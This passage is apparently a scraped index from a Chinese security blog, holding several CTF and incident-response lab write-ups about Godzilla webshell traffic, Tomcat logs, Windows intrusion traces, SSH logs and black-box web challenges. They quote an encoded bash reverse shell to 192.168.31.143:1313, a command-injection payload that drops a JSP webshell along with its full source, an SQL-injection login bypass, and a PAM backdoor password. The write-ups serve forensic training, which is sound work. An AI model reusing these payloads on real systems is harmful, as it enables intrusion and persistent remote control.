RWXcode-8a1ad303-d54a-4ee6-bf06-79c09e867bed 1 2024-09-19 08:15:43 0 RWX.XIM-unix 0 2024-09-19 06:29:59 4096 RWXssh-vWnAfxielC 0 2024-09-19 08:43:32 4096 RWXssh-HqBIxaU2OF 0 2024-09-19 08:15:37 4096 RWXhsperfdata_root 0 2024-09-19 06:29:59 4096 RWXsystemd-private-fe1119a9e31340ada72ff5bdd7dcb056-systemd-timesyncd.service-wVf4Jf 0 2024-09-19 06:29:59 4096 RWX1.pcap 1 2024-09-19 09:03:14 1490944 RW.Test-unix 0 2024-09-19 06:29:59 4096 RWX.X11-unix 0 2024-09-19 06:29:59 4096 RWX.ICE-unix 0 2024-09-19 06:29:59 4096 RWX.font-unix 0 2024-09-19 06:29:59 4096 RWXssh-P22RjIKAZ3 0 2024-09-19 08:19:17 4096 RWXssh-F8xrTEcjZ2 0 2024-09-19 08:39:58 4096 RWXssh-JmgaMLTFgu 0 2024-09-19 08:21:23 4096 RWXssh-r6qMz7wlBA 0 2024-09-19 09:00:35 4096 RWX 数据流56 1234请求fileName /tmp/pam_unix.sofileValue NELF响应ok 数据流57 1234请求cmdLine l sh -c &quot;cd &quot;/&quot;;echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzEuMTQzLzEzMTMgMD4mMQ==|base64 -d|bash&quot; 2&gt;&amp;1arg-3 2&gt;&amp;1executableFile shexecutableArgs i -c &quot;cd &quot;/&quot;;echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzEuMTQzLzEzMTMgMD4mMQ==|base64 -d|bash&quot; 2&gt;&amp;1arg-0 shargsCount 4arg-1 -carg-2 _ cd &quot;/&quot;;echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzEuMTQzLzEzMTMgMD4mMQ==|base64 -d|bashmethodName execCommand响应空 分析数据流46，前面的cmdLine sh -c &quot;cd &quot;/&quot;是哥斯拉自动执行的，后面的uname -r是攻击者执行的，因此答案就是这个 1flag{uname -r} 步骤#7黑客连接webshell时查询当前shell的权限是什么？ 由步骤六的数据流47可知，攻击者执行了命令id，用于查询用户和用户组相关的身份信息 1uid=0(root) gid=0(root) groups=0(root) 因此当前shell的权限就是root 1flag{root} 步骤#8黑客利用webshell执行命令查询服务器Linux系统发行版本是什么？ 分析步骤六中的数据流，发现数据流48运行了命令cat /etc/os-release，该命令主要作用是查看 Linux 操作系统的详细版本和发行相关信息 123456789PRETTY_NAME=&quot;Debian GNU/Linux 10 (buster)&quot;NAME=&quot;Debian GNU/Linux&quot;VERSION_ID=&quot;10&quot;VERSION=&quot;10 (buster)&quot;VERSION_CODENAME=busterID=debianHOME_URL=&quot;https://www.debian.org/&quot;SUPPORT_URL=&quot;https://www.debian.org/support&quot;BUG_REPORT_URL=&quot;https://bugs.debian.org/&quot; 因此答案就是PRETTY_NAME的值 1flag{Debian GNU/Linux 10 (buster)} 步骤#9黑客利用webshell执行命令还查询并过滤了什么？（提交整条执行成功的命令） 数据流49，攻击者先是错误地输入了 rmp，发现命令不存在 然后数据流50中攻击者修正了命令为 rpm，执行rpm -qa | grep pam，但是返回结果仍显示not found 12&gt;&amp;1: 1: 2&gt;&amp;1: rpm: not found rpm命令是用于管理RPM包的命令行工具，这个命令是在查询pam相关的包，pam模块与Linux的用户认证有关，是一个非常敏感和危险的位置 在数据流51，攻击者根据之前的失败，推断出这不是一个基于RPM的系统（如CentOS），转而使用Debian/Ubuntu系的 dpkg 命令进行查询，并成功获取了信息 123456Desired=Unknown/Install/Remove/Purge/Hold| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)||/ Name Version Architecture Description+++-====================-============-============-========================================ii libpam-modules:amd64 1.3.1-5 amd64 Pluggable Authentication Modules for PAM 攻击者执行成功的命令就是dpkg -l libpam-modules:amd64 1flag{dpkg -l libpam-modules:amd64} 步骤#10黑客留下后门的反连的IP和PORT是什么？（IP:PORT) 数据流52中的请求体中存在base64编码 1L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzEuMTQzLzEzMTMgMD4mMQ== 解码后得到结果为 很明显，这个就是反连命令，因此IP是192.168.31.143，端口为1313 1flag{192.168.31.143:1313} 步骤#11黑客通过什么文件留下了后门？ 继续分析步骤六中的数据包，发现数据流56跟文件相关 1234请求fileName /tmp/pam_unix.sofileValue NELF响应ok 攻击者上传了一个恶意的PAM模块文件 pam_unix.so。该方法攻击原理是，用这个恶意文件替换掉Linux系统中负责密码验证的核心模块，从而植入一个“万能密码”（例如 password123）或“后门用户”（无论输入什么密码都能成功），从而实现对系统身份认证机制的劫持 可以看到攻击者上传路径为/tmp/pam_unix.so，这个先记住，后面有用 因此后门文件就是这个 1flag{pam_unix.so} 步骤#12黑客设置的后门密码是什么？ 连接到玄机靶场机器，进去后执行history查看攻击者执行的历史命令 可以看到，攻击者先将系统正常的用户密码认证模块（pam_unix.so）备份成一个隐藏文件，然后用自己上传的、含有后门功能的同名恶意文件（/tmp/pam_unix.so）替换掉原始文件（/lib/x86_64-linux-gnu/security/pam_unix.so） 直接在/tmp里面查找会找不到pam_unix.so，估计是攻击者删除了 那我们去/lib/x86_64-linux-gnu/security目录查找，成功找到目标文件 将pam_unix.so拷贝下来，用IDA进行静态分析 pam_sm_authenticate 是 Linux PAM（可插拔认证模块，Pluggable Authentication Modules）中认证服务模块的核心函数，专门用于验证用户身份 因此我们找到函数pam_sm_authenticate进行分析，成功获得后门密码XJ@123 1flag{XJ@123} 步骤#13黑客的恶意dnslog服务器地址是什么？ wireshark语法搜索dns，可以找到黑客的恶意dnslog服务器地址，但是要注意这个地址后面有个点号（后面分析IDA发现的） 或者可以通过IDA分析pam_sm_authenticate认证函数来获取dnslog地址 1flag{c0ee2ad2d8.ipv6.xxx.eu.org.} 参考momo安全：https://mp.weixin.qq.com/s/rhPT5H0IZ4nm6JcgacRg8Q","link":"/posts/Xuanji-CTF-Godzilla-Traffic-Analysis/"},{"title":"玄机靶场 | 日志分析-Tomcat日志分析","text":"前言小王在自己的服务器上安装配置了Tomcat，并写了几个简单的网页。但由于安全意识不足，很快就被攻击者利用了。请你帮他排查一下存在的安全问题 RDP 端口3389 用户名/密码：Administrator/4210bf@ 索引 题目列表步骤#1Tomcat日志所在的绝对路径是？ 首先连接目标电脑，在C盘中可以看到server目录，根据名字猜测是提供服务的 点进去可以看到tomcat目录 打开目录文件，在里面找到logs目录，然后复制路径即可 1flag{C:\\server\\apache-tomcat-11.0.5\\logs} 步骤#2攻击者对某网站进行了口令爆破。请你判断口令成功匹配的请求的响应码是？ 我们打开logs目录，可以看到里面有个日志占用空间较大 打开文件进行分析，前面是攻击者在进行目录扫描，然后后面有个关键的地方 这里攻击者访问了/demo/admin.jsp，但是由于没有凭证随后重定向到登录界面，也就是login.jsp，接着就开始对网站进行口令爆破 可以看到，在经历了大量了爆破之后也是成功登入了系统，状态码显示302，然后跳转到/demo/admin.jsp 因此判断口令成功匹配的响应码就是302 1flag{302} 步骤#3请你判断其服务器上用于盗取cookie而监听的端口是？ 题目描述：攻击者向admin.jsp的管理员留言板界面发送了恶意JS代码从而构成了存储型XSS。已知攻击者试图盗取管理员cookie，并将其发送至其本地服务器上。 题目提示攻击者向admin.jsp发送恶意代码，结合前面的日志，我们可知该文件位于/demo目录里面 里面有个messages.txt，打开后可以看到里面存储了管理员留言板接收到的信息 这个js语句就是攻击者用来窃取管理员cookie的，因此用来监听的端口就是5000 1flag{5000} 接下来我们分析一下admin.jsp中的漏洞代码，里面有个代码片段用于显示留言 12345678910&lt;h2&gt;所有留言&lt;/h2&gt;&lt;ul&gt; &lt;% if (messages != null &amp;&amp; !messages.isEmpty()) { for (String message : messages) { %&gt; &lt;li&gt;&lt;%= message %&gt;&lt;/li&gt; &lt;% } } %&gt;&lt;/ul&gt; 其中关键就是&lt;li&gt;&lt;%= message %&gt;&lt;/li&gt;，它使用了 JSP 的表达式 &lt;%= ... %&gt; 直接将从文件中读取的 message 字符串未经任何处理就输出到 HTML 页面上 攻击者提交的留言内容会原封不动地保存到messages.txt 文件里，浏览器在解析 HTML 时，会把 &lt;script&gt; 标签当作可执行代码来运行，从而触发XSS漏洞 修复建议就是对输出的 message 变量进行HTML 实体编码 修复前： 1&lt;li&gt;&lt;%= message %&gt;&lt;/li&gt; 修复后： 123&lt;%@ page import=&quot;org.apache.commons.lang3.StringEscapeUtils&quot; %&gt;// ... &lt;li&gt;&lt;%= StringEscapeUtils.escapeHtml4(message) %&gt;&lt;/li&gt; 或者使用JSTL标签库 首先在JSP页面顶部引入JSTL核心标签库 1&lt;%@ taglib uri=&quot;http://java.sun.com/jsp/jstl/core&quot; prefix=&quot;c&quot; %&gt; 然后使用 &lt;c:out&gt; 标签来输出内容，它默认就会进行HTML编码 123&lt;c:forEach var=&quot;message&quot; items=&quot;${messages}&quot;&gt; &lt;li&gt;&lt;c:out value=&quot;${message}&quot; /&gt;&lt;/li&gt;&lt;/c:forEach&gt; 步骤#4攻击者利用执行系统命令的参数是？ 回到刚才的log日志，在最下面可以看到有个文件传递了系统命令内容 该文件原本可能是用于接收IP地址并执行网络命令的（如 ping 或 traceroute），攻击者没有输入一个正常的IP地址，而是通过命令连接符 &amp;&amp; 执行系统命令，因此参数就是ip 1flag{ip} 步骤#5攻击者通过某种手段遗留了后门文件，请你找到该文件并按需提交其文件中的flag 同样也是刚才的日志文件，看最下面那行的参数内容 1ip=8.8.8.8+%26%26+echo+%5E%3C%25%40+page+language%3D%22java%22+import%3D%22java.util.*%2Cjava.io.*%22+%25%5E%3E%5E%3C%25+String+cmd+%3D+request.getParameter%28%22cmd%22%29%3B+if+%28cmd+%21%3D+null%29+%7B+Process+p+%3D+Runtime.getRuntime%28%29.exec%28cmd%29%3B+BufferedReader+reader+%3D+new+BufferedReader%28new+InputStreamReader%28p.getInputStream%28%29%29%29%3B+String+line%3B+while+%28%28line+%3D+reader.readLine%28%29%29+%21%3D+null%29+%7B+out.println%28line+%2B+%22%5E%3Cbr%5E%3E%22%29%3B+%7D+%7D+%25%5E%3E+%3E+C%3A%5Cserver%5Capache-tomcat-11.0.5%5Cwebapps%5CROOT%5Chello.jsp HTTP/1.1&quot; 200 1349 URL解码，查看原始内容 1ip=8.8.8.8 &amp;&amp; echo ^&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*,java.io.*&quot; %^&gt;^&lt;% String cmd = request.getParameter(&quot;cmd&quot;); if (cmd != null) { Process p = Runtime.getRuntime().exec(cmd); BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream())); String line; while ((line = reader.readLine()) != null) { out.println(line + &quot;^&lt;br^&gt;&quot;); } } %^&gt; &gt; C:\\server\\apache-tomcat-11.0.5\\webapps\\ROOT\\hello.jsp HTTP/1.1&quot; 200 1349 可以看到攻击者把代码写进了C:\\server\\apache-tomcat-11.0.5\\webapps\\ROOT\\hello.jsp 我们简单分析这个后门代码 1234567891011121314151617&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*,java.io.*&quot; %&gt;&lt;% // 从URL请求中获取名为 &quot;cmd&quot; 的参数 String cmd = request.getParameter(&quot;cmd&quot;); // 如果 &quot;cmd&quot; 参数存在 if (cmd != null) { // 在服务器上执行该参数的值作为一个系统命令 Process p = Runtime.getRuntime().exec(cmd); // 读取该命令执行后的输出结果 BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream())); String line; // 将输出结果逐行打印到网页上 while ((line = reader.readLine()) != null) { out.println(line + &quot;&lt;br&gt;&quot;); } }%&gt; 文件上传后，攻击者只需要访问/hello.jsp?cmd=即可执行系统命令 我们找到这个文件，查看里面的内容 可以看到里面有个注释写了flag 1/* 疑似flag? eW91bWFkZWl0 */ 但是如果直接提交的话是不行的，需要进行base64解码后再提交 1flag{youmadeit}","link":"/posts/Xuanji-CTF-Tomcat-Log-Analysis/"},{"title":"玄机靶场 | Where-1S-tHe-Hacker-P2","text":"前言靶机可以用玄机的，也可以在公众号下载，这里我选择用自己下载的，感谢划水但不摆烂提供的资源 题目下载地址：https://pan.baidu.com/s/14OPvxDgsEsY-O3e34K2FUw?pwd=2024 划水应急工具包：https://pan.baidu.com/s/1dwBMRQO3TUEMx8FWVeJLew?pwd=ltja 服务器账号密码 admin Aa123456 进去后运行phpstudy开启相关服务 因为玄机的题目是从靶机内部题目挑选的，不完整，因此本文分两部分 索引 玄机题目步骤#1最早的WebShell落地时间是（时间格式统一为：2022/12/12/2:22:22）; 上传D盾到目标机器，把C:\\phpstudy_pro\\WWW目录放入D盾扫描 发现大量WebShell文件，点进去C:\\phpstudy_pro\\WWW\\attachment\\php\\2023\\11，按时间排序，找到最早的WebShell落地时间即可 1flag{2023/11/11/0:30:07} 步骤#2黑客最早的WebShell密码是多少，将WebShell密码作为Flag值提交； 用记事本打开WebShell文件，找到连接密码 1flag{pass} 步骤#3CobaltStrike木马被添加进计划任务的时间是 win+r输入taskschd.msc打开任务计划程序，找到\\Microsoft\\Windows\\AppID\\，查看计划任务，发现有个可疑任务，在每天9:50自动触发，查看启动程序 但是这个huorong.exe我怎么找都找不到，网上百度了一下，发现别人也找不到，最后查看官方WP确定了这是个木马文件，但是不知道什么原因找不到了 然后我们导出该文件，用浏览器打开 成功得到CobaltStrike木马文件的修改时间 1flag{2023/11/15/8:02:20} 步骤#4黑客启用并添加进管理员组的用户与时间是 答案格式：Username,2022/12/12/2:22:22）； 用D盾检测用户账号，发现Guest被启用并添加进管理员组 cmd打开输入net user guest查看guest的修改时间 1flag{guest,2023/11/11/0:45:59} 步骤#5攻击者使用弱口令登录ftp的时间是 打开C:\\phpstudy_pro\\Extensions\\FTP0.9.60\\Logs查看FTP的登录日志 总共三个，一个个点进去看看，发现第二个有问题 成功得到攻击者登录ftp的时间 1flag{2023/11/11/1:08:54} 步骤#6攻击者使用弱口令登录web管理员的时间是 这里我们主要审计Apache的日志，打开C:\\phpstudy_pro\\Extensions\\Apache2.4.39\\logs，审计access.log.1700006400 题目问的是攻击者使用弱口令登录web管理员的时间，我们可以尝试用弱口令自己爆破网站，然后抓取登录成功的包，在日志里面进行匹配，就可以找到攻击者的登录时间 打开浏览器输入127.0.0.1/index.php，然后点击上一级，回到首页 用弱口令字典爆破即可，不限方法，爆破得到账号为admin，密码为123456，然后登录抓包 重新回到日志，ctrl+f搜索index.php?mod=site&amp;act=manager&amp;do=main&amp;beid=1 成功得到攻击者登录后台管理页面的时间 如果你不想爆破网站，直接分析日志也可以，一般情况下登录成功会有302跳转，我们可以直接筛选302跳转，并根据日志特征进行匹配 可以看到URI里面包含manager，通过上下文分析，可以确定这是登录成功的跳转页面，不过想更精确的话还是第一种方法好 1flag{2023/11/15/7:38:31} 靶机内部题目（除去相同题目）步骤#7CobaltStrike远程控制木马的文件名与落地时间是？（答案格式：ABC.exe,2022/12/12/2:22:22） 这题我用绿盟D-Eyes扫了很久都没扫出来，在安全中心的隔离区也没找到，不知道什么原因，查找计划任务里面的木马路径也没有 一般情况下遇到这种题目，我们用安全工具扫描就可以，例如火绒、绿盟D-Eyes等，但是这里不知道为什么电脑找不到这个木马 这里直接给出官方的答案 1huorong.exe,2023/11/15/7:45:47 步骤#8攻击者查看上传回显路径的时间是？ 攻击者上传木马之后，需要知道文件被上传到哪里，这时我们从攻击者登录后台管理员账号的时间之后开始审计日志 这里可以看到，在一大波注入攻击之后出现一个文件查询的URI，猜测是显示文件路径的，我们粘贴到网页执行（先登录网站） 这些参数的URL就是木马文件路径，可以尝试蚁剑连接验证 确定是木马文件，成功得到攻击者查看上传回显路径的时间 12023/11/15/7:38:53 步骤#9第二批WebShell的最早上传时间是？ 前面我们知道了木马的回显路径，因此可以在该路径上进行分析，打开C:\\phpstudy_pro\\WWW\\attachment\\2023\\11，然后按时间排序，可以看到木马的上传时间分两个时间段，一些是2023/11/11，另一些是2023/11/15 打开15号最早的文件验证，确定是木马文件 右键打开属性，获取具体时间 当然如果想稳妥的话还是分析日志文件好，打开C:\\phpstudy_pro\\Extensions\\Apache2.4.39\\logs\\access.log.1700006400，筛选出状态码为200的日志记录进行分析 可以看到这里攻击者采用了SSRF攻击，通过在inc_config.php写入木马，让网站去fetch这个文件并保存在本地，然后通过webshell连接并控制网站，因此第二批WebShell的最早上传时间就是这个 12023/11/15/7:40:10 步骤#10根据上题线索，WebShell开始通信的时间是？ 沿着上面的日志记录继续往下分析，发现可疑记录 可以看到发送POST请求，与木马文件进行交互，打开文件验证一下 因此WebShell开始通信的时间就是这个 12023/11/15/7:42:36 靶机内部题目答案这是靶机内部答题.exe的答案 参考特别鸣谢 划水但不摆烂：https://mp.weixin.qq.com/s/4PQ5TaBUUpW_9hkm-kue1Q","link":"/posts/Xuanji-CTF-Where-1S-tHe-Hacker-P2/"},{"title":"玄机靶场 | Where-1S-tHe-Hacker","text":"前言我一开始用的是在线靶机，但是因为一些不可抗拒因素，具体参考步骤#11，所以最终把靶机下载到本地分析，同时也能省点金币，题目可以在划水但不摆烂公众号下载 题目下载地址：https://pan.baidu.com/s/1MwRbI6Cbz2j_hlHInVL1Bg?pwd=fmzu 服务器账号密码 admin Aa123456 注：样本请勿在本地运行 索引 玄机题目步骤#1找到黑客ID 为多少,将黑客ID 作为 FLAG 提交; 打开网页根目录，发现index.php被挂了黑页，在文件内容里面找到黑客ID 1flag{X123567X} 步骤#2找到黑客在什么时间修改了网站主页,将黑客修改了网站主页的时间 作为 FLAG 提交（y-m-d-4:22:33）; 直接查看属性，找到修改时间 提交的时候有个问题，如果时间你是直接复制属性中的，提交时会显示错误，因为属性中的时间携带不可见字符，正确的做法是自己手打进去，具体可以看看010editor的分析 1flag{2023-11-6-4:55:13} 步骤#3找到黑客第一个webshell文件名是,将第一个webshell文件名 作为FLAG 提交; 可以用D盾，也可以手工排查，这里我选择手工排查 找到Apache目录下的访问日志 前面大量的HEAD表示的是黑客在进行目录扫描，可以不看，直接跳到后半部分扫描结束那里，通过排查，发现两个疑似webshell的可疑文件 去根目录下找到对应的文件，查看进行确认 发现两个都是黑客上传的webshell文件，按照时间顺序，第一个webshell文件名是SystemConfig.php 1flag{SystemConfig.php} 步骤#4找到黑客第二个webshell文件名是,将第二个webshell文件名 作为FLAG 提交; 同上，第二个webshell文件名是syscon.php 1flag{syscon.php} 步骤#5找到黑客第二个webshell的连接密码是,将第二个webshell的连接密码 作为FLAG 提交; 步骤三那里可以得到第二个webshell的连接密码是pass 1flag{pass} 步骤#6找到黑客新建的隐藏账户,将新建的隐藏账户名字 作为FLAG 提交; 有很多方法可以实现，这里选择注册表查看 win+r然后输入regedit打开注册表编辑器，找到HKEY_LOCAL_MACHINE\\SAM\\SAM，但是这里不能直接查看，我们右键点击SAM，赋予完全控制权限 然后重新打开注册表，进入HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names，找到当前计算机全部用户，发现隐藏用户为admin$ 有时候攻击者可能不会直接新增隐藏用户，而是通过修改Guest用户注册表对应的F值（权限分配）与本地管理Administrator的权限相同，相当于克隆了Administrator，这也需要我们额外注意 还有一个方法，就是直接在此电脑那里查看，更快速，但是平时的话还是建议用注册表来分析，更加精准 1flag{admin$} 步骤#7找到黑客隐藏账户创建时间是,将隐藏账户创建时间是 作为FLAG 提交（答案格式：2024/12/3 9:16:23）; 直接cmd打开，输入net user admin$查看账户详细信息 1flag{2023/11/6 4:45:34} 步骤#8找到黑客添加隐藏账户进管理员组的时间,将添加隐藏账户进管理员组的时间 作为FLAG 提交（答案格式：2024/12/3 9:16:23）; 这里要用到系统事件分析，按Win+R键输入eventvwr.msc打开事件查看器 常见事件ID类型 12345678910111213144624 登录成功4625 登录失败，如果有人尝试破解系统密码，可以看到大量连续登录失败信息4726 删除用户4722 账号启用4725 账号禁用4723 修改密码4724 重置密码4634 注销成功4647 用户启动的注销4672 管理员登录4720 创建用户，使用系统漏洞攻击成功后，往往会创建一个用户，方便远程登录4732 加入安全组，常见于将新用户加入管理员组4733 移除出安全组4684 通过登陆界面登陆的 这里我们筛选4732，时间的话我们根据admin$的创建时间，选择2023/11/6 4:45:00开始，结束时间随便，可以选小点缩小范围 一个个点进去查看，找到添加到管理员组的事件 注意时间格式 1flag{2023/11/6 4:46:07} 步骤#9找到黑客在什么时间从文件中读取保留的密钥,将读取保留的密钥的时间 作为FLAG 提交（答案格式：2024/12/3 9:16:23）; 这里我们聚焦于两个事件ID 125051 将保留的密钥写入文件5058 从文件中读取保留的密钥 也是通过事件查看器去找，时间我这里选择不变 也是按时间顺序找就行 注意时间格式 1flag{2023/11/6 4:46:58} 步骤#10找到黑客通过隐藏账户通过(PTH)哈希传递攻击登录的时间是,将(PTH)哈希传递攻击登录的时间 作为FLAG 提交; 哈希传递攻击指的是攻击者无需知道用户的明文密码，只需窃取密码的哈希值（Hash），就能冒充该用户登录到网络中的其他系统。 这里我们聚焦于NtLmSsp（NT LAN Manager Security Support Provider），它用于处理 NTLM 协议的身份验证，我们去筛选登录事件，找到登录进程为NtLmSsp的即可，对应的事件ID为4624 按照时间顺序一个个筛选 注意时间格式 1flag{2023/11/6 4:47:28} 步骤#11找到黑客上传的两个CobaltStrike木马文件名,将上传的两个CobaltStrike木马文件名 作为FLAG 提交（答案格式：”A.exe,B.exe”）; 这里用绿盟D-Eyes主机命令行应急工具，将工具上传到目标机器，cmd输入D-Eyes fs扫盘 如果是多盘路径可以用D-Eyes fs -P C:\\\\,D:\\\\tmp,D:\\\\tools，也可以用D-Eyes.exe ps进行进程扫描，排查异常进程信息 这里我们就使用D-Eyes fs扫盘 这里只找到之前的webshell文件，并没有找到cs可疑文件，原因是部分文件被Windows Defender自动隔离了，需要从隔离区恢复 这里有个问题，如果用的是玄机靶场的话，已隔离威胁那里是找不到这些被隔离的文件，估计是那边默认给删除了，然后没被工作人员发现 所以我用的是下载来的靶场，还原文件之后再扫一遍，排查可疑文件，发现多了两个文件 把SystemTemp.exe和SysnomT.exe放进安恒云沙箱检测（拉取文件到本地之后不要运行） 可以看到这两个文件都是cs控制程序 1flag{SystemTemp.exe,SysnomT.exe} 靶机内部题目答案这是靶机内部答题.exe的答案，不是玄机靶场的答案，玄机的答案在上面各小点里 1234567891011X123567X2023‎年‎11‎月‎6‎日，‏‎4:55:13SystemConfig.phpsyscon.phppassadmin$2023/11/6 4:45:342023/11/6 4:46:072023/11/6 4:46:582023/11/6 4:47:28SystemTemp.exe和SysnomT.exe 参考特别鸣谢 划水但不摆烂：https://mp.weixin.qq.com/s/4UoIw-On-0taB8s0xtjkAw Peterpan.exe：https://blog.csdn.net/administratorlws/article/details/141672688","link":"/posts/Xuanji-CTF-Where-1S-tHe-Hacker/"},{"title":"玄机靶场 | 日志分析-ssh日志分析","text":"前言SSH连接端口222，账号：root，密码：toor SSH日志分析常用思路SSH日志分析是应急响应与安全审计的核心。通过审查配置文件和登录日志，可以快速发现未授权访问、定位攻击源并核查安全基线。标准的分析流程如下： 1. 审查配置：确认“规则” 分析日志前，先看SSH服务的核心配置文件 /etc/ssh/sshd_config，了解允许哪些行为 访问控制：检查 AllowUsers, AllowGroups 等指令，确定谁可以登录 认证方式：检查 PasswordAuthentication 是否开启，是否仅允许密钥登录 高危设置：检查 PermitRootLogin 是否允许root直接登录 2. 分析日志：发现“事件” 根据系统，主要分析以下认证日志（包括 .1, .gz 等归档文件）： Debian/Ubuntu: /var/log/auth.log CentOS/RHEL: /var/log/secure 重点关注包含以下关键字的日志条目： 成功登录：Accepted password 或 Accepted publickey 等 登录失败：Failed password 、Failed publickey 或 invalid user 等 用户切换/提权：session opened for user (常用于追踪sudo等操作) 3. 聚合统计：提取“情报” 使用命令行工具（如 grep, awk, sort, uniq）从海量日志中提取有价值的信息，回答关键问题： 攻击来源：哪个IP发起了最多的失败尝试？ 爆破目标：哪个用户名被攻击次数最多？ 成功渗透：哪些用户和IP成功登录了系统？ 行为画像：梳理单个IP或用户的完整活动时间线 索引 题目列表步骤#1可以登录 SSH 的账号数量是多少 我们先了解什么是sshd_config文件 sshd_config 是 SSH 服务器（sshd）的主配置文件，用于配置 SSH 服务端的各种参数和行为 设置 SSH 服务器监听的端口号（默认22端口） 指定允许或禁止的登录方式（密码认证、公钥认证等） 是否允许 root 账户远程登录 配置登录超时时间、日志级别、安全策略等 控制哪些用户或用户组可以通过SSH登录 查看/etc/ssh/sshd_config文件 1cat /etc/ssh/sshd_config 在最下面那里可以看到只允许SSHD_USER用户组和root用户组进行ssh登录 然后在/etc/group筛选出这两个组 1grep -E '^(root|SSHD_USER):' /etc/group 这个命令的意思是： -E 参数表示启用扩展正则表达式，支持更多高级符号和语法，如“|”表示或、“()”用于分组、“+”表示重复等，使表达式更简洁易读，匹配功能更强大 ^(root|SSHD_USER): 表示匹配以“root:”或“SSHD_USER:”开头的行 root组后面为空，表示这个组没有附加用户（也就是没有把别的用户名手动加进组内），默认为root。然后SSHD_USER组有两个用户，分别为toor和root，去重之后可以登录 SSH 的账号就只有toor和root用户 1flag{2} 步骤#2SSH日志中登录成功的日志条数是多少（去除自己登陆产生的两次） auth.log 是Linux系统记录身份认证相关信息的日志文件，包括用户登录成功、失败、ssh连接、公钥认证和使用sudo等操作的记录。它帮助管理员监控登录情况和发现安全问题，是安全审计的重要依据 其中auth.log表示最新日志，auth.log.1表示上一轮未压缩归档，auth.log.N.gz表示更早的归档（N为数字） 进入log日志文件夹，查看当前目录文件 1cd /var/log &amp;&amp; ls 我们要分析的是已归档文件，也就是auth.log.1和auth.log.2.gz 先解压auth.log.2.gz文件 1gzip -d auth.log.2.gz 用gzip命令解压后，会删除原本的.gz压缩文件，并生成新的文件 然后筛选出包含Accepted password或Accepted publickey的日志记录即可 Accepted password：表示通过密码验证成功登录 Accepted publickey：表示通过公钥认证成功登录 1grep -E &quot;Accepted password|Accepted publickey&quot; auth.log.1 auth.log.2 | wc -l 1flag{103} 步骤#3SSH日志中登录成功次数最多的用户的用户名是什么 用awk筛选登录成功的日志记录即可 1grep -E &quot;Accepted password|Accepted publickey&quot; auth.log.1 auth.log.2 | awk '{print $9}' | sort | uniq -c 可以看到SSH日志中登录成功次数最多的用户名是toor 1flag{toor} 步骤#4SSH日志中登录失败次数最多的用户以及登录使用的ip是什么(flag:flag{用户名,ip}) 直接筛选出包含Failed password或Failed publickey的记录，然后awk查看用户名和IP地址即可 1grep -E &quot;Failed password|Failed publickey&quot; auth.log.1 auth.log.2 | awk '{print $9, $(NF-3)}' | sort | uniq -c | sort -n awk '{print $9, $(NF-3)}' 表示打印第9列（用户名）和倒数第4列（登录来源IP，通常日志中IP在倒数第4列） sort 对结果进行排序 uniq -c 统计相同用户名和IP的出现次数 sort -n 表示按照 数字大小 进行排序，而不是按字母ASCII顺序 可以看到SSH日志中登录失败次数最多的用户是root，登录使用的ip是87.163.111.11 1flag{root,87.163.111.11}","link":"/posts/Xuanji-CTF-SSH-Log-Analysis/"},{"title":"CTFSHOW | 黑盒测试 web380 - web395","text":"什么是黑盒测试黑盒测试（Black-Box Testing）是一种软件测试方法，测试人员在完全不了解程序内部结构和源代码的情况下，对程序的功能进行测试。测试人员就像普通用户一样，只能通过程序的输入（如点击链接、在输入框中填写数据）来观察其输出，以此判断程序是否存在问题 黑盒测试一般思路在进行黑盒测试时，通常会遵循一个系统性的流程，大致可以分为以下几个关键步骤： 1. 信息收集 (Reconnaissance) 这是所有测试的第一步，目的是尽可能多地了解目标，发现所有可能的攻击入口 目录/文件扫描：使用工具扫描网站可能存在的隐藏目录和文件，如后台登录页面、功能性文件、源码备份等。 前端代码分析：查看网页的HTML、CSS和JavaScript源码（浏览器F12或Ctrl+U），从中寻找隐藏的路径、注释、API接口等。 技术栈识别：通过HTTP响应头、错误信息、网页页脚等判断网站使用的技术（如Apache、Nginx等），有助于我们选择更具针对性的测试方法。 2. 漏洞发现 (Vulnerability Analysis) 收集到足够的信息后，就可以对发现的各个功能点和入口点进行漏洞测试 输入点测试：对所有用户可以输入数据的地方（如URL参数、搜索框、登录框）进行测试，寻找SQL注入、文件包含、命令执行等漏洞。 认证与授权测试：测试登录认证机制是否可以被绕过或破解，例如使用万能密码、暴力破解、伪造JWT等。 逻辑测试：测试应用程序的业务逻辑是否存在缺陷，例如密码重置功能是否可以被滥用、支付流程是否可以被绕过等。 3. 漏洞利用 (Exploitation) 在确认漏洞存在后，构造特定的Payload来利用这个漏洞，以达到我们的最终目的。在CTF中，这个目的通常是读取服务器上的flag文件。在真实的渗透测试中，目的可能是获取服务器的控制权或窃取敏感数据等 题目列表web380扫描网站目录，发现存在两个文件路径 其中第一个大小为0B，可以不用管，直接看第二个路径/page.php 显示打开$id.php失败，我们尝试能不能控制这个参数，输入/page.php?id=1 发现存在文件包含漏洞，直接输入/page.php?id=flag，查看源码得到flag web381打开网站，查看网页源代码，发现相比上一题，这里多了个可疑路径 为了更直观地看到区别，这里把上一题的网页源码放出来 我们访问路径/alsckdfy，成功得到flag web382打开网站，查看网页源代码，跟上一题一样 继续访问路径/alsckdfy，这次打开了一个登录框 尝试用万能密码，成功登录，账号1' or 1=1 #，密码随便写，成功得到flag web383跟上题步骤一样，也是先访问路径/alsckdfy，打开登录框后输入万能密码得到flag web384跟之前一样，来到登录框这里，这次题目有提示，告诉我们密码前2位是小写字母，后三位是数字，很明显是要爆破 因此我们抓取登录的包来尝试爆破，账号用admin，密码可以根据题目要求生成一个字典，python脚本如下 123456789101112131415import stringimport itertoolsfilename = &quot;passwd.txt&quot;letters = string.ascii_lowercase # 小写字母 'abcdefghijklmnopqrstuvwxyz'digits = string.digits # 数字 '0123456789'with open(filename, 'w') as f: for letter_pair in itertools.product(letters, 